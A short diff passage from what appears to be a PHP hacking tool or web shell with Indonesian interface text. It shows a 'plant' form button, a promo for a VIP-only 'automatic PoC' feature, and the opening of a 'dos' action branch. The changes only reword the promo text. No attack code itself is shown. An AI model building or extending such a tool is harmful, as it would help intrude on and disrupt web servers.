@@ -3503,9 +3503,9 @@ dotted;width:300px;height:250px;'><br> <table class="tabnet" style="width:333px;
 <input type="submit" class="inputzbut" name="fire" value="  TANAM   ">
 <br>
 <br>
-<font color='gold'>Special tool untuk Noob dengan fungsi automatic Poc, Hanya VIP Members yang dapat menggunakan fitur ini, Kode akses VIP silakan klik <a href='https://alxwahid.blogspot.com' 
+<font color='gold'>Noob special tool dengan automatic Poc, hanya VIP Members yang dapat menggunakan fitur ini, untuk kode akses VIP silakan klik <a href='https://alxwahid.blogspot.com' 
 
-target='_blank'>VIP.KEY</font><br></tr></td></table></center>
+target='_blank'>GET.KEY</font><br></tr></td></table></center>
 <?php
 		} elseif($_GET['do'] == 'dos'){
 ?>
